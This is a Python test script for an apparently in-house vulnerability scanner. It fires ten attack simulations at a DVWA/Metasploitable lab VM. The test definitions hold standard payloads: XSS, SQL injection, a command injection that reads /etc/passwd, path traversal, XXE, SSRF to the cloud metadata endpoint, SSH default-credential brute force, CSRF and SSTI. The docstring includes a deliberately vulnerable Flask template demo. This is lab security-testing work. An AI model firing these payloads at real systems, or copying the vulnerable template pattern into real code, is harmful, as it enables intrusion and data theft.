#!/usr/bin/env python3
"""
test_vuln_scanner.py
====================
Tests all 10 vuln_scanner test types against 192.168.56.102 (DVWA + Metasploitable).

PREREQUISITES (read before running):
  01 - XSS          : DVWA must be running at http://192.168.56.102/dvwa/
                      Set security=low in DVWA Security settings.
                      Get your session: login to DVWA, open browser DevTools ->
                      Application -> Cookies -> copy PHPSESSID value.
                      Paste into PHPSESSID variable below.

  02 - SQLi         : Same DVWA session required.

  03 - CMD Injection: Same DVWA session required.

  04 - Path Traversal: Targets http://192.168.56.102/ directly (no DVWA session needed).

  05 - XXE          : Targets any XML-accepting endpoint. Using generic probe.

  06 - SSRF         : Targets DVWA SSRF page if present, or generic URL param.

  07 - SSH Brute    : msfadmin:msfadmin confirmed on port 22.

  08 - Port Scan    : Simple TCP check on common ports.

  09 - CSRF         : Requires DVWA session on a state-changing page.

  10 - SSTI         : Requires a Flask SSTI demo running on the VM first.
                      SSH into VM and run:
                        python3 -c "
                        from flask import Flask,request,render_template_string
                        app=Flask(__name__)
                        @app.route('/')
                        def index():
                            q=request.args.get('q','')
                            return render_template_string('<h1>'+q+'</h1>')
                        app.run(host='0.0.0.0',port=5001)
                        "

HOW TO USE:
  1. Set your API_KEY below (from your running Docker environment).
  2. Set PHPSESSID to your current DVWA session cookie.
  3. Run: python test_vuln_scanner.py

All 10 tests will be launched sequentially and results will be polled and printed.
"""

import requests
import time
import json

# ─── CONFIGURATION ────────────────────────────────────────────────────────────
BASE_URL   = "http://127.0.0.1:8000/api/v1/simulations/"
TARGET_IP  = "192.168.56.102"
API_KEY    = "e21db8c9c690b97861f9ba68d4540d2d2fedf1dffc0d69bf98d826dccb6a3936"    # <-- Set this

# For DVWA tests (01, 02, 03, 06, 09): paste your DVWA session cookie here
PHPSESSID  = "REPLACE_WITH_YOUR_PHPSESSID"  # <-- Set this before running DVWA tests

HEADERS    = {"X-API-Key": API_KEY}
# ──────────────────────────────────────────────────────────────────────────────

DVWA_COOKIE = {"Cookie": f"PHPSESSID={PHPSESSID}; security=low"}

# ─── ALL 10 TEST DEFINITIONS ──────────────────────────────────────────────────
VULN_TESTS = [
    # ── 01: XSS ───────────────────────────────────────────────────────────────
    {
        "name": "VulnScan-01-XSS",
        "description": "Reflected XSS via DVWA XSS (Reflected) page with security=low",
        "target": f"http://{TARGET_IP}/dvwa/vulnerabilities/xss_r/",
        "options": {
            "test_type": "xss",
            "method": "GET",
            "inject_param": "name",
            "payload": "<script>alert(1)</script>",
            "headers": DVWA_COOKIE,
            "timeout": 15,
        },
    },

    # ── 02: SQLi ──────────────────────────────────────────────────────────────
    {
        "name": "VulnScan-02-SQLi",
        "description": "SQL injection via DVWA SQLi page with security=low",
        "target": f"http://{TARGET_IP}/dvwa/vulnerabilities/sqli/",
        "options": {
            "test_type": "sqli",
            "method": "GET",
            "inject_param": "id",
            "payload": "' OR '1'='1",
            "headers": DVWA_COOKIE,
            "timeout": 20,
        },
    },

    # ── 03: Command Injection ─────────────────────────────────────────────────
    {
        "name": "VulnScan-03-CMDInjection",
        "description": "OS command injection via DVWA Command Injection page with security=low",
        "target": f"http://{TARGET_IP}/dvwa/vulnerabilities/exec/",
        "options": {
            "test_type": "cmd_injection",
            "method": "POST",
            "inject_param": "ip",
            "payload": "127.0.0.1; cat /etc/passwd",
            "extra_form_fields": {"Submit": "Submit"},  # DVWA exec form needs this
            "headers": DVWA_COOKIE,
            "timeout": 20,
        },
    },

    # ── 04: Path Traversal ────────────────────────────────────────────────────
    {
        "name": "VulnScan-04-PathTraversal",
        "description": "Path traversal to read /etc/passwd via Metasploitable web server",
        "target": f"http://{TARGET_IP}/",
        "options": {
            "test_type": "path_traversal",
            "method": "GET",
            "payload": "../../../etc/passwd",
            "inject_param": "file",
            "headers": {},
            "timeout": 15,
        },
    },

    # ── 05: XXE ───────────────────────────────────────────────────────────────
    {
        "name": "VulnScan-05-XXE",
        "description": "XML External Entity injection to read /etc/passwd",
        "target": f"http://{TARGET_IP}/",
        "options": {
            "test_type": "xxe",
            "method": "POST",
            "payload": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            "headers": {"Content-Type": "application/xml"},
            "timeout": 15,
        },
    },

    # ── 06: SSRF ──────────────────────────────────────────────────────────────
    {
        "name": "VulnScan-06-SSRF",
        "description": "SSRF probe via DVWA — tries to fetch AWS metadata endpoint",
        "target": f"http://{TARGET_IP}/dvwa/vulnerabilities/fi/",
        "options": {
            "test_type": "ssrf",
            "method": "GET",
            "inject_param": "page",
            "payload": "http://169.254.169.254/latest/meta-data/",
            "headers": DVWA_COOKIE,
            "timeout": 15,
        },
    },

    # ── 07: SSH Brute Force ───────────────────────────────────────────────────
    {
        "name": "VulnScan-07-SSHBrute",
        "description": "SSH brute force — msfadmin:msfadmin confirmed on Metasploitable",
        "target": TARGET_IP,
        "options": {
            "test_type": "bruteforce",
            "auth_type": "ssh",
            "credentials_list": [
                {"username": "msfadmin", "password": "msfadmin"},
                {"username": "root", "password": "root"},
                {"username": "admin", "password": "admin"},
            ],
            "ssh_port": 22,
            "timeout": 30,
        },
    },

    # ── 08: Port Scan ─────────────────────────────────────────────────────────
    {
        "name": "VulnScan-08-PortScan",
        "description": "Check if common ports are open on Metasploitable",
        "target": TARGET_IP,
        "options": {
            "test_type": "portscan",
            "port": 80,
            "timeout": 10,
        },
    },

    # ── 09: CSRF ──────────────────────────────────────────────────────────────
    {
        "name": "VulnScan-09-CSRF",
        "description": "CSRF test against DVWA CSRF page with security=low (no CSRF protection expected)",
        "target": f"http://{TARGET_IP}/dvwa/vulnerabilities/csrf/",
        "options": {
            "test_type": "csrf",
            "method": "POST",
            "payload": "password_new=hacked&password_conf=hacked&Change=Change",
            "headers": DVWA_COOKIE,
            "timeout": 15,
        },
    },

    # ── 10: SSTI ──────────────────────────────────────────────────────────────
    {
        "name": "VulnScan-10-SSTI",
        "description": "SSTI probe against Flask demo on port 5001 (must be running on VM)",
        "target": f"http://{TARGET_IP}:5001/",
        "options": {
            "test_type": "ssti",
            "method": "GET",
            "inject_param": "q",
            "payload": "{{7*7}}",
            "headers": {},
            "timeout": 15,
        },
    },
]
# ──────────────────────────────────────────────────────────────────────────────


def launch_test(test: dict) -> str | None:
    """Launch one vuln_scanner simulation and return its sim_id."""
    payload = {
        "name": test["name"],
        "target": test["target"],
        "modules": ["vuln_scanner"],
        "options": test["options"],
    }
    try:
        r = requests.post(BASE_URL, json=payload, headers=HEADERS, timeout=10)
        r.raise_for_status()
        sim_id = r.json().get("id") or r.json().get("simulation_id")
        print(f"  ✅ Launched  [{test['name']}]  id={sim_id}")
        return sim_id
    except Exception as e:
        print(f"  ❌ FAILED    [{test['name']}]  → {e}")
        return None


def poll_results(sim_ids: list[str], timeout_sec: int = 120) -> dict:
    """Poll until all sims finish (status != running/queued) or timeout."""
    deadline  = time.time() + timeout_sec
    remaining = set(sim_ids)
    results   = {}

    while remaining and time.time() < deadline:
        time.sleep(5)
        try:
            r = requests.get(BASE_URL, headers=HEADERS, timeout=10)
            sims = r.json()
        except Exception as e:
            print(f"  ⚠️  Poll error: {e}")
            continue

        for sim in sims:
            sid = sim.get("id") or sim.get("simulation_id")
            if sid not in remaining:
                continue
            status = sim.get("status", "")
            if status not in ("running", "queued", "pending", ""):
                remaining.discard(sid)
                results[sid] = sim
                print(f"  📦 Completed [{sim.get('name')}]  status={status}")

    return results


def print_report(tests: list[dict], sim_id_map: dict[str, str], results: dict):
    """Pretty-print results keyed by test name."""
    print("\n" + "═" * 70)
    print("  VULN SCANNER — FULL TEST REPORT")
    print("═" * 70)
    for test in tests:
        name   = test["name"]
        sid    = sim_id_map.get(name)
        result = results.get(sid) if sid else None

        print(f"\n{'─' * 60}")
        print(f"  TEST : {name}")
        print(f"  DESC : {test['description']}")
        if not sid:
            print(f"  STATUS : ❌ Never launched")
            continue
        if not result:
            print(f"  STATUS : ⚠️  Timeout / still running")
            continue

        status = result.get("status", "?")
        print(f"  STATUS : {status.upper()}")
        for mod in result.get("module_results", []):
            findings = mod.get("findings", [])
            print(f"  FINDINGS : {len(findings)}")
            for f in findings:
                sev   = f.get("severity", "?").upper()
                title = f.get("title", "?")
                icon  = "🔴" if sev in ("CRITICAL","HIGH") else ("🟡" if sev == "MEDIUM" else "🔵")
                print(f"    {icon} [{sev}] {title}")

    print("\n" + "═" * 70)


def main():
    print("=" * 70)
    print("  SecureForge — Vuln Scanner Module — All 10 Tests")
    print(f"  Target: {TARGET_IP}")
    print("=" * 70)

    if "REPLACE" in API_KEY:
        print("\n❌  ERROR: Set your API_KEY before running this script.")
        return
    if "REPLACE" in PHPSESSID:
        print("\n⚠️  WARNING: PHPSESSID not set — DVWA tests (01, 02, 03, 06, 09) will likely fail.")

    sim_id_map: dict[str, str] = {}  # test_name → sim_id
    all_ids: list[str] = []

    print("\n[1/3] Launching all 10 tests...\n")
    for test in VULN_TESTS:
        sid = launch_test(test)
        if sid:
            sim_id_map[test["name"]] = sid
            all_ids.append(sid)
        time.sleep(1)  # small gap between launches

    if not all_ids:
        print("\n❌  No tests launched. Check API_KEY and server connection.")
        return

    print(f"\n[2/3] Polling {len(all_ids)} simulations (up to 120s)...\n")
    results = poll_results(all_ids, timeout_sec=120)

    print("\n[3/3] Generating report...\n")
    print_report(VULN_TESTS, sim_id_map, results)


if __name__ == "__main__":
    main()
